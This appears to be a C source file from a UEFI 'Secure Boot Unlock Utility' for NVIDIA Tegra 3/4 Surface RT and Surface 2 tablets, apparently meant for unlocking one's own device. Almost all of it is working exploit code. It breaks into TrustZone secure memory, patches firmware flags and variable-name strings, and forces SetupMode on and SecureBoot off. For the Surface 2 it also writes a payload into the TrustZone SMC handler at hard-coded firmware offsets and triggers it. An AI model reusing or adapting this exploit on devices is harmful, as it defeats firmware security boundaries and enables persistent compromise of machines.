// Exploit.c: Device specific exploit code
#include "Include/Application.h"
#include "Include/Devices.h"
#include <Library/MemoryAllocationLib.h>


#define DUMP_SIZE 0x2000000
CHAR8 g_FirmwareDumpBuffer[DUMP_SIZE + 1] = {0};

EFI_STATUS loadPayloadIntoMemory(EFI_PHYSICAL_ADDRESS memoryAddress, short unsigned int fileName[], size_t* fileSize);

void memcpy_usr(void* dest, const void* src, size_t n) {
	char *src_char = (char *)src;
	char *dest_char = (char *)dest;
	for (int i=0; i<n; i++) {
		dest_char[i] = src_char[i]; //copy contents byte by byte
	}
}


#define _MEM(addr) *(volatile uint32_t *)(addr)
#define mem_read(addr) _MEM(addr)
#define mem_write(addr, value) _MEM(addr) = value
#define mem_clear(base, value) _R_MEMEG(addr) &= ~value
#define mem_set(base, value) _RE_MEMG(addr) |= value



void DisplayCommonBanner()
{
  Print(L"\nYahallo - Tegra 3/4 Secure Boot Unlock Utility\n");
  Print(L"Be aware that this process can take a few minutes\n");
}

void SurfaceRTExploit()
{
  EFI_STATUS Status = EFI_SUCCESS;

  DisplayCommonBanner();
  Print(L"\nElevator for Surface RT\n");

  // Perform the TrustZone exploit, so TrustZone memory
  // can be unprotected from normal world
  Print(L"Hmmm.\n");
  PerformNvTegra3Exploit();
  Print(L"Hmmmmmm.\n");

  // TrustZone memory is not mapped in normal world.
  // Since I am lazy to modify PT, I decided to just turn off MMU
  // and turn it back on later.
  ArmDisableCachesAndMmu();

  UINT32 Something = *((UINT32 *)(EFI_PHYSICAL_ADDRESS)0x80000000);
  ArmEnableMmu();
  ArmEnableDataCache();
  ArmEnableInstructionCache();
  Print(L"Something at 0x80000000 with exploit: 0x%x\n", Something);
  if (Something == 0xFFFFFFFF) {
    Print(L"Something happened and the exploit doesn't work\n");
    Status = EFI_ABORTED;
    goto exit;
  }

  // Check some offset things
  EFI_PHYSICAL_ADDRESS SetVariableAddress =
      (EFI_PHYSICAL_ADDRESS)(VOID *)gRT->SetVariable;
  // Shared memory start +0x5888, delta +0x5020
  EFI_PHYSICAL_ADDRESS SharedMemoryStartAddressPointerAddress =
      SetVariableAddress + 0x5020;
  EFI_PHYSICAL_ADDRESS SharedMemoryEndAddressPointerAddress =
      SetVariableAddress + 0x5018;
  UINT64 SharedMemoryStartAddress =
      *((UINT64 *)(EFI_PHYSICAL_ADDRESS)SharedMemoryStartAddressPointerAddress);
  // Similarly
  UINT64 SharedMemoryEndAddress =
      *((UINT64 *)(EFI_PHYSICAL_ADDRESS)SharedMemoryEndAddressPointerAddress);
  // Check if the value makes sense or not
  Print(L"Set Variable Address = 0x%llx\n", SetVariableAddress);
  Print(L"Shared Memory Start = 0x%llx\n", SharedMemoryStartAddress);
  Print(L"Shared Memory End = 0x%llx\n", SharedMemoryEndAddress);
  if (SharedMemoryEndAddress != SharedMemoryStartAddress + 0x12004) {
    Print(L"Shared memory area sanity check failed\n");
    Status = EFI_ABORTED;
    goto exit;
  }

  Print(L"Performing some search in the TZ memory region...\n");
  Print(
      L"This is usually quick. In worst case, it might lasts a few minutes.\n");
  Print(L"Please reset your device and retry if no progress is made in 15 "
        L"minutes.\n");

  // Where is TrustZone binary?
  // Turn off MMU before proceeding
  ArmDisableCachesAndMmu();
  char  GetHashStateString[]  = "GetHashState";
  void *pTzGetHashStateString = memmem(
      (void *)0x80000000, 0x2000000, GetHashStateString,
      sizeof(GetHashStateString));
  char *pRuntimeFlag1;
  char *pRuntimeFlag2;
  char  runtimeFlag1 = 0, runtimeFlag2 = 0, valid = 0;
  // GetHashState = +0x949d0
  // RuntimeMode flag 1: +0xb9150 (clear buffer and re-reg buffer)
  // RuntimeMode flag 2: +0xb9124 (variable checks that)
  if (pTzGetHashStateString != NULL) {
    pRuntimeFlag1 = ((char *)pTzGetHashStateString + 0x24780);
    pRuntimeFlag2 = ((char *)pTzGetHashStateString + 0x24754);

    runtimeFlag1 = *pRuntimeFlag1;
    runtimeFlag2 = *pRuntimeFlag2;
    valid        = 1;
  }
  ArmEnableMmu();
  ArmEnableDataCache();
  ArmEnableInstructionCache();
  if (valid) {
    Print(
        L"Runtime Flag 1 = %d, Runtime Flag 2 = %d\n", runtimeFlag1,
        runtimeFlag2);
    Print(
        L"GetHashState string address = 0x%llx\n",
        (UINT64)pTzGetHashStateString);
    if (runtimeFlag1 != 1 || runtimeFlag2 != 1) {
      Print(L"Unexpected Runtime Flag value\n");
      goto exit;
    }
  }
  else {
    Print(L"Pattern not found. Hmm.\n");
    Status = EFI_NOT_FOUND;
    goto exit;
  }

  // Revert runtime mode flags, phase 1
  ArmDisableCachesAndMmu();
  *pRuntimeFlag1 = 0;
  *pRuntimeFlag2 = 0;
  ArmDataSynchronizationBarrier();
  ArmEnableMmu();
  ArmEnableDataCache();
  ArmEnableInstructionCache();

  // Re-trigger runtime mode registration
  UINT32 Ret = 0;
  Ret        = ArmCallSmcHelper(0x03, 0x05, 0, 0);
  Print(L"ArmCallSmcHelper: 0x%x\n", Ret);
  if (Ret != 0) {
    Print(L"Unexpected call from ArmCallSmcHelper - runtime mode patch phase "
          L"1\n");
    goto exit;
  }

  // Revert runtime mode flags, phase 2
  // Patch string, phase 1
  ArmDisableCachesAndMmu();
  *pRuntimeFlag1 = 0;
  *pRuntimeFlag2 = 0;
  // String is located at +0x94c64, delta = +0x294
  char *pSetupModeString = ((char *)pTzGetHashStateString + 0x294);
  // String is located at +0x94c78, delta = +0x2a8
  char *pSecureBootString = ((char *)pTzGetHashStateString + 0x2a8);
  // BetupMode
  *pSetupModeString  = 'B';
  *pSecureBootString = 'B';
  ArmDataSynchronizationBarrier();
  ArmEnableMmu();
  ArmEnableDataCache();
  ArmEnableInstructionCache();
  // Re-register shared memory buffer area
  // To let variable services pick it up again
  Ret = ArmCallSmcHelper(0x03, 0x06, (UINT32)SharedMemoryStartAddress, 0x24008);
  Print(L"ArmCallSmcHelper: 0x%x\n", Ret);
  if (Ret != 0) {
    Print(L"Unexpected call from ArmCallSmcHelper - shared memory address "
          L"registration\n");
    goto exit;
  }

  // Ready to patch the variable
  Print(L"Thinking....\n");
  UINT8 Data = 1;
  Status     = gRT->SetVariable(
      L"SetupMode", &gEfiGlobalVariableGuid,
      EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS |
          EFI_VARIABLE_NON_VOLATILE,
      sizeof(UINT8), &Data);
  if (!EFI_ERROR(Status)) {
    Data   = 0;
    Status = gRT->SetVariable(
        L"SecureBoot", &gEfiGlobalVariableGuid,
        EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS |
            EFI_VARIABLE_NON_VOLATILE,
        sizeof(UINT8), &Data);
    if (!EFI_ERROR(Status)) {
      Print(L"Have fun\n");
      UINTN VarSize = sizeof(UINT8);
      Status        = gRT->GetVariable(
          L"SetupMode", &gEfiGlobalVariableGuid, NULL, &VarSize, &Data);
      if (!EFI_ERROR(Status)) {
        Print(L"SetupMode = 0x%x\n", Data);
      }

      Status = gRT->GetVariable(
          L"SecureBoot", &gEfiGlobalVariableGuid, NULL, &VarSize, &Data);
      if (!EFI_ERROR(Status)) {
        Print(L"SecureBoot = 0x%x\n", Data);
      }
    }
    else {
      Print(L"Something happened: 0x%x (SecureBoot)\n", Status);
    }
  }
  else {
    Print(L"Something happened: 0x%x (SetupMode)\n", Status);
  }

exit:
  FinalizeApp();
}

void Surface2_Fw_2_06_500_Exploit()
{
  // SetVariableAddress = Base + 0xb54
  // gSharedMemoryStart = Base + 0x5ff8
  // gSharedMemoryEnd = Base + 0x5ff0
  // GetHashState = Base + 0x97ee8
  // RuntimeMode flag 1: Base+0xbe7c8
  // RuntimeMode flag 2: Base+0xbe79c
  // SecureBoot / SetupMode strings:
  // String is located at Base+0x983bc, delta = 0x4D4
  // String is located at Base+0x983d0, delta = 0x4E8
  SURFACE2_FW_OFFSET_INFO fwInfo = {
      0x54A4, 0x549C, 0x268E0, 0x268B4, 0x4D4, 0x4E8,
  };
  Surface2Exploit(&fwInfo);
}

void Surface2_Fw_4_22_500_Exploit()
{
  // SetVariableAddress = Base + 0xb54
  // gSharedMemoryStart = Base + 0x5ff8
  // gSharedMemoryEnd = Base + 0x5ff0
  // GetHashState = Base + 0x97c2c
  // RuntimeMode flag 1: Base+0xbe510
  // RuntimeMode flag 2: Base+0xbe4e4
  // SecureBoot / SetupMode strings:
  // String is located at Base+0x9811c, delta = 0x4F0
  // String is located at Base+0x98130, delta = 0x504
  SURFACE2_FW_OFFSET_INFO fwInfo = {
      0x54A4, 0x549C, 0x268E4, 0x268B8, 0x4F0, 0x504,
  };
  Surface2Exploit(&fwInfo);
}

void Surface2Exploit(PSURFACE2_FW_OFFSET_INFO pFwInfo)
{
  EFI_STATUS Status = EFI_SUCCESS;

  DisplayCommonBanner();
  Print(L"\nElevator for Surface 2\n");

  // Perform the TrustZone exploit, so TrustZone memory
  // can be unprotected from normal world
  Print(L"Hmmm.\n");
  PerformNvTegra4Exploit();
  Print(L"Hmmmmmm.\n");

	/////////////////////////////////////////////	
/*
	  // Dump the firmware from 0x80000000 to 0x82000000
  Print(L"Proceed to dump the firmware!\n");
  ArmDisableCachesAndMmu();
  ArmInvalidateTlb();
  ArmInvalidateDataCache();
  ArmInvalidateInstructionCache();
  CopyMem(g_FirmwareDumpBuffer, (VOID *)0x80000000, DUMP_SIZE);
  ArmEnableMmu();
  ArmEnableDataCache();
  ArmEnableInstructionCache();
  Print(L"Dump finalized. Save to memory...\n");

  // Save this to file
  EFI_HANDLE *fsHandles     = NULL;
  UINTN       fsHandleCount = 0;

  Status = gBS->LocateHandleBuffer(
      ByProtocol, &gEfiSimpleFileSystemProtocolGuid, NULL, &fsHandleCount,
      &fsHandles);
  if (EFI_ERROR(Status)) {
    Print(L"Failed to get EFI Simple Filesystem Protocol Buffer: %r\n", Status);
    goto exit;
  }

  for (UINTN i = 0; i < fsHandleCount; i++) {
    EFI_SIMPLE_FILE_SYSTEM_PROTOCOL *fsProtocol      = NULL;
    EFI_FILE_PROTOCOL *              rootDirProtocol = NULL;
    EFI_FILE_PROTOCOL *              fileProtocol    = NULL;
    UINTN                            bufferSize = sizeof(g_FirmwareDumpBuffer);

    Status = gBS->HandleProtocol(
        fsHandles[i], &gEfiSimpleFileSystemProtocolGuid, (VOID **)&fsProtocol);
    if (EFI_ERROR(Status)) {
      Print(L"Failed to get EFI Simple Filesystem Protocol: %r\n", Status);
      continue;
    }

    Status = fsProtocol->OpenVolume(fsProtocol, &rootDirProtocol);
    if (EFI_ERROR(Status)) {
      Print(L"Failed to open directory: %r\n", Status);
      continue;
    }

    Status = rootDirProtocol->Open(
        rootDirProtocol, &fileProtocol, L"Firmware.bin",
        EFI_FILE_MODE_CREATE | EFI_FILE_MODE_READ | EFI_FILE_MODE_WRITE, 0);
    if (EFI_ERROR(Status)) {
      Print(L"Failed to open file: %r\n", Status);
      rootDirProtocol->Close(rootDirProtocol);
      continue;
    }

    Status = fileProtocol->SetPosition(fileProtocol, 0);
    if (EFI_ERROR(Status)) {
      Print(L"Failed to set position of file: %r\n", Status);
      fileProtocol->Close(fileProtocol);
      rootDirProtocol->Close(rootDirProtocol);
      continue;
    }

    Status =
        fileProtocol->Write(fileProtocol, &bufferSize, g_FirmwareDumpBuffer);
    if (EFI_ERROR(Status)) {
      Print(L"Failed to write file: %r\n", Status);
      fileProtocol->Close(fileProtocol);
      rootDirProtocol->Close(rootDirProtocol);
      continue;
    }

    Status = fileProtocol->Flush(fileProtocol);
    fileProtocol->Close(fileProtocol);
    rootDirProtocol->Close(rootDirProtocol);
  }
	
	 Print(L"Saved to memory.\n");
	while(1);
	////////////////////////////
*/	
	
  	Print(L"Loading exploit payload into memory!\n");
	size_t fileSize1 = 0;
	Status = loadPayloadIntoMemory((EFI_PHYSICAL_ADDRESS)0x83000000, L"\\payload.bin", &fileSize1);
	if (Status != EFI_SUCCESS)
	{
		Print(L"\tFailed at loading payload!\n");

		FinalizeApp();
	}
	Print(L"\tPayload is now in memory!\n");
	// Put uboot into memory
	Print(L"Loading u-boot into memory!\n");

	size_t fileSize2 = 0;
	Status = loadPayloadIntoMemory((EFI_PHYSICAL_ADDRESS)0x84000000, L"\\u-boot-dtb-s2.bin", &fileSize2);
	if (Status != EFI_SUCCESS)
	{
		Print(L"\tFailed at loading u-boot!\n");

		FinalizeApp();
	}
	Print(L"\tU-boot is now in memory!\n");  
    
  // TrustZone memory is not mapped in normal world.
  // Since I am lazy to modify PT, I decided to just turn off MMU
  // and turn it back on later.
  ArmDisableCachesAndMmu();
  ArmInvalidateTlb();
  ArmInvalidateDataCache();
  ArmInvalidateInstructionCache();

  UINT32 Something = *((UINT32 *)((VOID *)0x80000000));
  
  // Copy payload into Trustzone memory.
	// 0x80112174 is in the SMC handler, right after the Synchronization barriers
	// The memory needs to be marked as secure, as you can only execute secure memory in secure mode so
	// we copy the payload to TZ memory
	//surface 1 address is 0x80112174
	//surface 2 address is 0x80119F74 (4.22.500 UEFI)
	//surface 2 address is 0x801167F4 (2.06.500 UEFI)

	//memcpy_usr((void*)(0x80112174), (const void*)0x83000000, (size_t)fileSize1);
	//memcpy_usr((void*)(0x80119F74), (const void*)0x83000000, (size_t)fileSize1);
	
	memcpy_usr((void*)(0x801167F4), (const void*)0x83000000, (size_t)fileSize1);
	
  
  ArmEnableMmu();
  ArmEnableDataCache();
  ArmEnableInstructionCache();
  Print(L"Something at 0x80000000 with exploit: 0x%x\n", Something);
  // If memory access succeeded, we should read something not just FFFFFFF
  if (Something == 0xFFFFFFFF) {
    Print(L"Something happened and the exploit doesn't work\n");
    Status = EFI_ABORTED;
    goto exit;
  }

  // EXIT BOOT SERVICES
  /* exit kills usb - disable for now
	UINTN MemMapSize = 0;
	EFI_MEMORY_DESCRIPTOR* MemMap = 0;
	UINTN MapKey = 0;
	UINTN DesSize = 0;
	UINT32 DesVersion = 0;

	gBS->GetMemoryMap(
                &MemMapSize,
                MemMap,
                &MapKey,
                &DesSize,
                &DesVersion
        );


        Status = gBS->ExitBootServices(
              ImageHandle,
                MapKey
        );

        if (EFI_ERROR(Status))
        {
                Print(L"Failed to exit BS\n");
       }
  */
	// This should trigger an SMC, jump to the payload and output stuff to uart. Hopefully.
	ArmCallSmcHelper(0, 0, 0, 0);
  
Print(L"Something happened and the smc jump to the payload failed\n");
	
	while(1);
  //below not executed 
  
  //////////////////////////////////
  //      ORIGINAL CODE BELOW     //
  //////////////////////////////////
  
  // Check some offset things. The NvVariableDxe.efi program directly
  // registers its variable handler to EFI System Table, so we have a
  // convenient way to determine its memory location.
  //
  // We want to retrieve the original shared buffer address to
  // normally invoke EFI variable services.

  UINTN SetVariableAddress = (UINTN)((VOID *)gRT->SetVariable);

  UINTN SharedMemoryStartAddressPointerAddress =
      SetVariableAddress + pFwInfo->UefiNsWorldBufferStartOffset;
  UINTN SharedMemoryEndAddressPointerAddress =
      SetVariableAddress + pFwInfo->UefiNsWorldBufferEndOffset;

  UINTN SharedMemoryStartAddress =
      *((UINTN *)SharedMemoryStartAddressPointerAddress);
  UINTN SharedMemoryEndAddress =
      *((UINTN *)SharedMemoryEndAddressPointerAddress);

  // Check if the value makes sense or not
  Print(L"Set Variable Address = %p\n", SetVariableAddress);
  Print(L"Shared Memory Start = %p\n", SharedMemoryStartAddress);
  Print(L"Shared Memory End = %p\n", SharedMemoryEndAddress);
  if (SharedMemoryEndAddress != SharedMemoryStartAddress + 0x12004) {
    Print(L"Shared memory area sanity check failed: size mismatch (wrong "
          L"data?)\n");
    Status = EFI_ABORTED;
    goto exit;
  }

  Print(L"Performing some search in the TZ memory region...\n");
  Print(
      L"This is usually quick. In worst case, it might lasts a few minutes.\n");
  Print(L"Please reset your device and retry if no progress is made in 15 "
        L"minutes.\n");

  // Where is TrustZone binary?
  // Turn off MMU before proceeding for the same reason.
  // There's no good way to determine its actual location assuming it might
  // change, But since we know GetHashState string only appears in TZ binary, we
  // just brute force search the memory for the result.
  ArmDisableCachesAndMmu();
  ArmInvalidateTlb();
  ArmInvalidateDataCache();
  ArmInvalidateInstructionCache();

  const char GetHashStateString[] = "GetHashState";
  // This might not has to search 0x80000000 to 0x83000000, can be smaller
  void *pTzGetHashStateString = memmem(
      (void *)0x80000000, 0x2000000, GetHashStateString,
      sizeof(GetHashStateString));
  volatile char *pRuntimeFlag1;
  volatile char *pRuntimeFlag2;
  char           runtimeFlag1 = 0, runtimeFlag2 = 0, valid = 0;
  // GetHashState = Base + 0x97c2c
  // RuntimeMode flag 1: Base+0xbe510 (clear buffer and register buffer again
  // with handler) RuntimeMode flag 2: Base+0xbe4e4 (variable checks that so
  // secure variable cannot be written) Clear these two flags to 0 to allow
  // register buffer again
  if (pTzGetHashStateString != NULL) {
    pRuntimeFlag1 =
        ((volatile char *)pTzGetHashStateString +
         pFwInfo->UefiSecureWorldRuntimeFlag1Offset);
    pRuntimeFlag2 =
        ((volatile char *)pTzGetHashStateString +
         pFwInfo->UefiSecureWorldRuntimeFlag2Offset);

    runtimeFlag1 = *pRuntimeFlag1;
    runtimeFlag2 = *pRuntimeFlag2;
    valid        = 1;
  }

  ArmEnableDataCache();
  ArmEnableInstructionCache();
  ArmEnableMmu();

  if (valid) {
    Print(
        L"Runtime Flag 1 = %d, Runtime Flag 2 = %d\n", runtimeFlag1,
        runtimeFlag2);
    Print(L"GetHashState string address = %p\n", pTzGetHashStateString);
    // They are supposed to be 1
    if (runtimeFlag1 != 1 || runtimeFlag2 != 1) {
      Print(L"Unexpected Runtime Flag value\n");
      goto exit;
    }
  }
  else {
    Print(L"Pattern not found. Hmm.\n");
    Status = EFI_NOT_FOUND;
    goto exit;
  }

RuntimePhase1:
  CortexA15CachePrime();

  Print(L"Disabling MMU...\n");

  // Revert runtime mode flags, phase 1
  ArmDisableCachesAndMmu();
  ArmInvalidateTlb();
  ArmInvalidateDataCache();
  ArmInvalidateInstructionCache();

  *(volatile UINT32 *)pRuntimeFlag1 = 0;
  *(volatile UINT32 *)pRuntimeFlag2 = 0;

  ArmDataMemoryBarrier();
  ArmDataSynchronizationBarrier();
  ArmCleanInvalidateDataCache();

  ArmEnableMmu();
  ArmEnableDataCache();
  ArmEnableInstructionCache();

  Print(L"MMU re-enabled + caches re-enabled\n");

  // Re-trigger runtime mode switch, which clears the old registration
  UINT32 Ret = 0;
  Ret        = ArmCallSmcHelper(0x03, 0x05, 0, 0);
  Print(L"ArmCallSmcHelper: 0x%x\n", Ret);
  if (Ret == 1) {
    Print(L"Retrying... -- runtime mode patch phase 1\n");
    goto RuntimePhase1;
  }
  else if (Ret != 0) {
    Print(L"Unexpected call from ArmCallSmcHelper - runtime mode patch phase "
          L"1\n");
    goto exit;
  }

PatchStringPhase1:
  CortexA15CachePrime();

  Print(L"Disabling MMU...\n");

  // Revert runtime mode flags, phase 2
  // Patch string, phase 1
  ArmDisableCachesAndMmu();
  ArmInvalidateTlb();
  ArmInvalidateDataCache();
  ArmInvalidateInstructionCache();

  *pRuntimeFlag1 = 0;
  *pRuntimeFlag2 = 0;
  // String is located at Base+0x9811c, delta = 0x4F0
  volatile char *pSetupModeString =
      ((volatile char *)pTzGetHashStateString +
       pFwInfo->UefiSecureWorldSetupModeStringOffset);
  // String is located at Base+0x98130, delta = 0x504
  volatile char *pSecureBootString =
      ((volatile char *)pTzGetHashStateString +
       pFwInfo->UefiSecureWorldSecureBootStringOffset);
  // BetupMode, BecureBoot
  *pSetupModeString  = 'B';
  *pSecureBootString = 'B';

  ArmDataMemoryBarrier();
  ArmDataSynchronizationBarrier();
  ArmCleanInvalidateDataCache();

  ArmEnableMmu();
  ArmEnableDataCache();
  ArmEnableInstructionCache();

  Print(L"MMU re-enabled + caches re-enabled\n");

  // Re-register shared memory buffer area
  // To let variable services pick it up again
  Ret = ArmCallSmcHelper(0x03, 0x06, (UINT32)SharedMemoryStartAddress, 0x24008);
  Print(L"ArmCallSmcHelper: 0x%x\n", Ret);
  if (Ret == 1) {
    Print(L"Retrying... -- shared memory address registration\n");
    goto PatchStringPhase1;
  }
  else if (Ret != 0) {
    Print(L"Unexpected call from ArmCallSmcHelper - shared memory address "
          L"registration\n");
    goto exit;
  }

  // Ready to patch the variable
  Print(L"Thinking....\n");
  UINT8 Data = 1;
  // SecureMode = 1 to disarm all security checks
  Status = gRT->SetVariable(
      L"SetupMode", &gEfiGlobalVariableGuid,
      EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS |
          EFI_VARIABLE_NON_VOLATILE,
      sizeof(UINT8), &Data);
  if (!EFI_ERROR(Status)) {
    Data = 0;
    // SecureBoot = 0 to explicitly disable Secure Boot
    Status = gRT->SetVariable(
        L"SecureBoot", &gEfiGlobalVariableGuid,
        EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS |
            EFI_VARIABLE_NON_VOLATILE,
        sizeof(UINT8), &Data);
    if (!EFI_ERROR(Status)) {
      Print(L"Have fun\n");
      UINTN VarSize = sizeof(UINT8);
      Status        = gRT->GetVariable(
          L"SetupMode", &gEfiGlobalVariableGuid, NULL, &VarSize, &Data);
      if (!EFI_ERROR(Status)) {
        Print(L"SetupMode = 0x%x\n", Data);
      }

      Status = gRT->GetVariable(
          L"SecureBoot", &gEfiGlobalVariableGuid, NULL, &VarSize, &Data);
      if (!EFI_ERROR(Status)) {
        Print(L"SecureBoot = 0x%x\n", Data);
      }
    }
    else {
      Print(L"Something happened: 0x%x (setting SecureBoot)\n", Status);
    }
  }
  else {
    Print(L"Something happened: 0x%x (setting SetupMode)\n", Status);
  }

exit:
  FinalizeApp();
}
EFI_STATUS loadPayloadIntoMemory(EFI_PHYSICAL_ADDRESS memoryAddress, short unsigned int fileName[], size_t* fileSize)
{
	EFI_LOADED_IMAGE *loaded_image = NULL;
	EFI_GUID loaded_image_protocol = LOADED_IMAGE_PROTOCOL;
	EFI_STATUS status;
	EFI_GUID sfspGuid = EFI_SIMPLE_FILE_SYSTEM_PROTOCOL_GUID;
	EFI_SIMPLE_FILE_SYSTEM_PROTOCOL* fs = NULL;

	status = gBS->HandleProtocol(
		gImageHandle,
		&loaded_image_protocol,
		(void **) &loaded_image);

	if (status != EFI_SUCCESS)
	{
		Print(L"Failed at 1st HandleProtocol\n");
		return status;
	}

	status = gBS->HandleProtocol(
		loaded_image->DeviceHandle,
		&sfspGuid,
		(void**)&fs);

	if (status != EFI_SUCCESS)
	{
		Print(L"Failed at 2nd HandleProtocol\n");
		return status;
	}

	EFI_FILE_PROTOCOL* fileProtocol = NULL;

	status = fs->OpenVolume(fs, &fileProtocol);
	EFI_FILE_PROTOCOL* file = NULL;

	if (status != EFI_SUCCESS)
	{
		Print(L"Failed at OpenVolume!\n");
		return status;
	}

	status = fileProtocol->Open(
			fileProtocol,
			&file,
			fileName,
			EFI_FILE_MODE_READ,
			EFI_FILE_READ_ONLY | EFI_FILE_HIDDEN | EFI_FILE_SYSTEM);

	if (status != EFI_SUCCESS)
	{
		Print(L"Failed at opening file!\n");
		return status;
	}

	EFI_FILE_INFO *payloadFileInformation = NULL;
	UINTN payloadFileInformationSize = 0;

	status = file->GetInfo(
			file,
			&gEfiFileInfoGuid,
			&payloadFileInformationSize,
			(VOID *) payloadFileInformation);

	if (status != EFI_SUCCESS && status != EFI_BUFFER_TOO_SMALL)
	{
		Print(L"Failed at getting file info! (1)\n");
		return status;
	}

	status = gBS->AllocatePool(
		EfiLoaderData,
		payloadFileInformationSize,
		(void**)&payloadFileInformation);

	if (status != EFI_SUCCESS)
	{
		Print(L"Failed at allocating pool!\n");
		return status;
	}

	SetMem(
		(VOID *)payloadFileInformation,
		payloadFileInformationSize,
		0xFF);

	status = file->GetInfo(
		file,
		&gEfiFileInfoGuid,
		&payloadFileInformationSize,
		(VOID *)payloadFileInformation
	);

	if (status != EFI_SUCCESS)
	{
		Print(L"Failed at getting file info! (2)\n");
		return status;
	}

	EFI_PHYSICAL_ADDRESS payloadFileBuffer = memoryAddress;

	UINTN payloadFileSize = payloadFileInformation->FileSize;

	Print(L"Payloadsize: %u\n", payloadFileSize);

	UINTN Pages = EFI_SIZE_TO_PAGES (payloadFileSize);
	status = gBS->AllocatePages(AllocateAddress, EfiLoaderData, Pages, &payloadFileBuffer);

	if (status != EFI_SUCCESS)
	{
		switch (status)
		{
		case EFI_OUT_OF_RESOURCES:

			break;
		case EFI_INVALID_PARAMETER:

			break;
		case EFI_NOT_FOUND:

			break;
		default:
			break;
		}

		Print(L"Failed at AllocatePages!\n");

		return status;
	}

	SetMem(
		(EFI_PHYSICAL_ADDRESS*)payloadFileBuffer,
		payloadFileSize,
		0xFF);

	status = file->Read(
		file,
		&payloadFileSize,
		(EFI_PHYSICAL_ADDRESS*)payloadFileBuffer
	);

	if (status != EFI_SUCCESS)
	{
		Print(L"Failed at reading file into memory!\n");
		return status;
	}

	*fileSize = payloadFileSize;

	Print(L"File is now in memory at location 0x%08lx!\n", payloadFileBuffer);


	//uart_print("Printing the 1st 4 bytes at 0x84000000: %08x\r\n", *((uint32_t*)(0x84000000)));

	return EFI_SUCCESS;
}
